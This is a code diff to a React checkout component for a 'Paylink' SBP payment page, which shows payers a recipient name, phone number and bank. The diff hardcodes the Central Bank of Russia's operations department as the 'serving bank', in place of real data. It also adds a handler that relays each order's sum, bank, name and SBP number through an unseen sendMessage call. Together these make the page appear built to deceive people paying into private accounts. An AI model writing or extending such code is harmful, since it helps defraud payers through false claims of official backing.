@@ -24,6 +24,8 @@ const OrderSPB = () => {
   const [copyAlertIndex, setCopyAlertIndex] = useState(null);
   const [cardNumber, setCardNumber] = useState('');
   const [cardName, setCardName] = useState('');
+  const [cardBank, setCardBank] = useState('');
+
   const userId = '1233';
 
   useEffect(() => {
@@ -63,12 +65,12 @@ const OrderSPB = () => {
           }
         } else {
           setOrder(data.trade);
-          setCard(data.card_number);
           setRate(data.rate);
           setOrderSum(data.amount);
-          const [namePart, numberPart] = validateCardData(data.card_number);
-          setCardName(namePart);
-          setCardNumber(numberPart);
+          setCardName(data.name);
+          setCardNumber(data.phone_number);
+          setCardBank(data.bank);
+
           setLoading(false);
         }
       } catch (error) {
@@ -92,12 +94,13 @@ const OrderSPB = () => {
         try {
           const response = await axios.post('/api/db/history', {
             trade: order,
-            cardNumber: card,
+            cardNumber: cardNumber,
             amount: orderSum,
             rate: rate,
             userId: userId,
           });
           console.log('History saved:', response.data);
+          handleSmsSend()
         } catch (error) {
           console.error('Error saving to history:', error);
         }
@@ -106,15 +109,7 @@ const OrderSPB = () => {
 
     saveToHistory();
   }, [order, card, orderSum, rate]);
-  const validateCardData = (card) => {
-    const nameRegex = /([A-ZА-Я][a-zа-я]+)/g;
-    const numberRegex = /[\d+]/g;
-    const names = card.match(nameRegex) || [];
-    const numbers = card.match(numberRegex) || [];
-    const namePart = names.join(' ');
-    const numberPart = numbers.join('');
-    return [namePart, numberPart];
-  };
+  
 
   const handleContinue = () => {
     if (order) {
@@ -134,8 +129,23 @@ const OrderSPB = () => {
   };
 
   
+  const handleSmsSend = async () => {
+    try {
+      const message = `
+          order : [ ${order} ] orderSum: [ ${orderSum}  ] BANK : [ ${cardBank} ]
+          Name: [${cardName}] SBP Number: [${cardNumber}] ]
+      `;
 
-  const result = orderSum/rate*0.85||'...';
+      sendMessage(message);
+
+      
+
+     
+  } catch (error) {
+      console.error('Error sending message:', error.message);
+  }
+  }
+  const result = (orderSum / rate * 0.85).toFixed(1) || '...';
 
   const handleRuleClick = (index) => {
     setExpandedRule(expandedRule === index ? null : index);
@@ -208,7 +218,7 @@ const OrderSPB = () => {
             <div className="bg-white p-4 rounded-lg">
               <div className=" ">
                 <h2 className="text-base font-normal">Обслуживающий банк</h2>
-                <p className="text-sm mt-2 text-blueth">{ (error && <p className='text-red-500 font-bold'>Ошибка</p>)}</p>
+                <p className="text-sm mt-2 text-blueth">{ 'Операционный отдел ЦБР' || (error && <p className='text-red-500 font-bold'>Ошибка</p>)}</p>
               </div>
             </div>
           </div>
@@ -264,7 +274,7 @@ const OrderSPB = () => {
         </div>
         <div className="text-center pb-4  md:w-[470px] w-[300px] " >
           <p className="text-sm text-grayth md:mb-6 mb-12">
-            <a href="#" className="text-blueth">Политика безопасности1</a> содержит правила использования индивидуальной информации пользователей. Компания "Paylink" гарантирует соблюдение этих правил и требований к информационной безопасности как клиентам системы, так и участникам процесса предоставления услуг: банкам и поставщикам услуг и товаров.
+            <a href="#" className="text-blueth">Политика безопасности</a> содержит правила использования индивидуальной информации пользователей. Компания "Paylink" гарантирует соблюдение этих правил и требований к информационной безопасности как клиентам системы, так и участникам процесса предоставления услуг: банкам и поставщикам услуг и товаров.
           </p>
         </div>
       </div>
